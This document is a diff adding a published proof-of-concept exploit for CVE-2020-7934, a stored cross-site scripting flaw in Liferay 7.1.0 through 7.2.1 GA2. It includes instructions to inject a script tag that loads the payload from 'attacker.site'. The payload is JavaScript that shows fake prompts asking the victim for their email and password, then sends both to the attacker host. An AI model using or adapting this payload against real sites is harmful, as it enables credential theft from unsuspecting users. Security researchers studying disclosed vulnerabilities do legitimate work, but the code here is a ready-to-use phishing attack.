@@ -1,0 +1,31 @@
+# Exploit Title: LifeRay 7.2.1 GA2 - Stored XSS
+# Date: 10/05/2020 
+# Exploit Author: 3ndG4me
+# Vendor Homepage: https://www.liferay.com/
+# Software Link: https://www.liferay.com/
+# Version: 7.1.0 -> 7.2.1 GA2 (REQUIRED)
+# Tested on: Debian Linux
+# CVE : CVE-2020-7934
+# Public Exploit/Whitepaper: https://github.com/3ndG4me/liferay-xss-7.2.1GA2-poc-report-CVE-2020-7934
+
+# NOTE: The attached proof of concept is a javascript payload,
+submitted as a ".txt" file to attach via email as ".js" is often
+blocked.
+
+// CVE-2020-7934 Cred Phishing Example Attack
+// Author: 3ndG4me
+// Github: https://github.com/3ndG4me/liferay-xss-7.2.1GA2-poc-report-CVE-2020-7934
+
+// Host this payload with your site and paste in this script tag into a vulnerable field with your URL replaced where relevant:
+// <SCRIPT SRC="//attacker.site/cve-2020-7934.js">
+
+var email = prompt("To process this search we need you to confirm your credentials.\n\nPlease confirm your email:", "");
+var password = prompt("To process this search we need you to confirm your credentials.\n\nPlease confirm your password:", "");
+
+
+console.log(email);
+console.log(password);
+
+var url = "http://attacker.site/" + email + ":" + password;
+
+$.get(url);
